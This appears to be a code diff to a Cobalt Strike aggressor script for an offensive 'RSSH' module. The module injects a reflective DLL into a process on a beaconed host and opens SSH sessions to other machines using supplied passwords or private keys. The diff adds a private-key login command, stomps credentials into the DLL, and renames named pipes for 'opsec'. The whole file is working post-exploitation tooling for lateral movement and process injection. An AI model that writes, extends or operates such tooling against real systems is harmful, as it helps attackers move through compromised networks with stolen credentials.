@@ -1,15 +1,15 @@
 import beacon.CommandBuilder;
 
-global('$ssh_inited $pipe_wait $error_1 $usage $server_dll_name $bof_write_pipe_name $reading_inited $pipe_output_name_final $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
+global('$ssh_inited $pipe_wait $error_1 $ssh_key_stomp_me $usage $server_dll_name $bof_write_pipe_name $reading_inited $pipe_output_name_final $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
 $ssh_inited = -1;
 $reading_inited = -1;
-$pipe_output_name_final = "BigGasPipe_updater_102"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
-$pipe_input_name_final = "BigGasPipe_updates_203"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
+$pipe_output_name_final = "BigGasPipe_000"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
+$pipe_input_name_final = "BigGasPipe_001"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
 
 $pipe_output_stomp_me_name = "OUTPUT_PIPE_NAME_NO_CHANGE_PLS";
 $pipe_input_stomp_me_name = "INPUT_PIPE_NAME_NO_CHANGE_PLS";
 
-$ssh_key_stomp_me = "SSH_KEY_NO_CHANGE_PLS"; # 512 bytes
+$ssh_key_stomp_me = "SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_"; # 1706 bytes
 
 $ssh_ip_stomp_me = "999.999.999.999";
 $ssh_username_stomp_me = "USERNAME_STRING_NO_CHANGE_PLS_USERNAME_STRING_NO_CHANGE_PLS_____";
@@ -20,7 +20,8 @@ $pipe_wait = 30000; # Custom timeout
 $server_dll_name = "dll_rs.shc.x64.dll"; # default name
 $bof_write_pipe_name  = "bof_write_pipe.x64.o";
 $usage = "You must init ssh first. Try: rssh-init <target ip> <username> <password> <optional: pid>";
-$error_1 = "RSSH is already initialized."
+$error_1 = "[RSSH] is already initialized.";
+
 # $1 - bytes where we are going to do the stoming
 # $2 - string we want to stomp
 # $3 - length of the string we want to stomp (for padding)
@@ -34,6 +35,8 @@ sub stomp-str {
 
     $padding_needed = $stomp_me_string_len - strlen($output_string);
     $padded_output_string = $output_string;
+    
+    println("ORIGINAL STRING: " . $stomp_me_string . "LEN: " . strlen($output_string));
 
     if ($padding_needed > 0) {
         $null_padding = "";
@@ -44,14 +47,16 @@ sub stomp-str {
         }
         $padded_output_string = $output_string . $null_padding;
     } else if ($padding_needed < 0) {
-        berror($beacon_id, "String '" . $output_string . "' is longer than max " . $stomp_me_string_len . " bytes!");
+        println("String '" . $output_string . " of length " . strlen($output_string) . "' is longer than max " . $stomp_me_string_len . " bytes!");
         return; # Important to return if name is too long
     }
-    # println("ORIGINAL STRING: " . $stomp_me_string);
-    # println("NEW STRING: " . $output_string);
+
+    println("NEW STRING: " . $output_string);
 
     # Now use $padded in strrep
     $output_string = strrep($bytes, $stomp_me_string, $padded_output_string);
+    
+    println("FINAL STRING: " . $output_string);
 
     return $output_string;
 }
@@ -69,13 +74,13 @@ alias rssh-key-init {
     $target_ssh_key_path = $4;
     $pid = $5; # optional PID
 
-    if($ssh_inited < 0){
-        berror($1, $$error_1);
+    if($ssh_inited > 0){
+        berror($beacon_id , $$error_1);
         return;
     }
 
-    if($target_ip is $null || $target_password is $null || $target_password is $null){
-        berror($1, "Invalid arguments");
+    if($target_ip is $null || $target_username is $null || $target_ssh_key_path is $null){
+        berror($beacon_id , "Invalid arguments");
         return;
     }
 
@@ -83,7 +88,7 @@ alias rssh-key-init {
     $barch = beacon_info($beacon_id, "barch");
 
     if ($barch != "x64") {
-        berror($1, "[RSSH] This script only supports x64 processes");
+        berror($beacon_id , "[RSSH] This script only supports x64 processes");
         return;
     }
 
@@ -92,7 +97,7 @@ alias rssh-key-init {
         $pid = beacon_info($beacon_id, "pid");
     }
 
-    blog($beacon_id, "[RSSH] SSH client connecting to " . $target_ip . " with " . $target_username . ":" . $target_password ." by injecting into process " . $pid . ".");
+    blog($beacon_id, "[RSSH] SSH client connecting to " . $target_ip . " with " . $target_username ." by injecting into process " . $pid . ".");
 
     # Build rdll path; This needs rework if you want to support x86 for whatever reason
     # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
@@ -121,7 +126,7 @@ alias rssh-key-init {
     closef($handle);
 
     # Now use $ssh_ip_stomp_me in strrep
-    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "512", $target_ssh_key);
+    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "1707", $target_ssh_key);
 
     # Now use $ssh_ip_stomp_me in strrep
     $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $target_ip);
@@ -205,14 +210,14 @@ alias rssh-init {
     $target_username = $3;
     $target_password = $4;
     $pid = $5; # optional PID
-    
-    if($ssh_inited < 0){
-        berror($1, $$error_1);
+
+    if($ssh_inited > 0){
+        berror($beacon_id , $$error_1);
         return;
     }
 
-    if($target_ip is $null || $target_password is $null || $target_password is $null){
-        berror($1, "Invalid arguments");
+    if($target_ip is $null || $target_username is $null || $target_password is $null){
+        berror($beacon_id , "Invalid arguments");
         return;
     }
 
@@ -220,7 +225,7 @@ alias rssh-init {
     $barch = beacon_info($beacon_id, "barch");
 
     if ($barch != "x64") {
-        berror($1, "[RSSH] This script only supports x64 processes");
+        berror($beacon_id , "[RSSH] This script only supports x64 processes");
         return;
     }
 
@@ -251,7 +256,7 @@ alias rssh-init {
     closef($handle);
 
     # Now use $ssh_ip_stomp_me in strrep
-    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "512", "0");
+    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "1707", "0");
 
     # Now use $ssh_ip_stomp_me in strrep
     $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $target_ip);
@@ -398,8 +403,15 @@ beacon_command_group(
 
 beacon_command_register(
 	"rssh-init",
-	"(64-bit only) Initializes RDLL and BOF to enable SSH session to target host. ",
+	"(64-bit only) Initializes RDLL and BOF to enable SSH session to target host with credentials. ",
 	"rssh-init <target ip> <username> <password> <optional: pid>",
+	"rssh"
+);
+
+beacon_command_register(
+	"rssh-key-init",
+	"(64-bit only) Initializes RDLL and BOF to enable SSH session to target host with a private key. ",
+	"rssh-init <target ip> <username> <path to private key> <optional: pid>",
 	"rssh"
 );
 
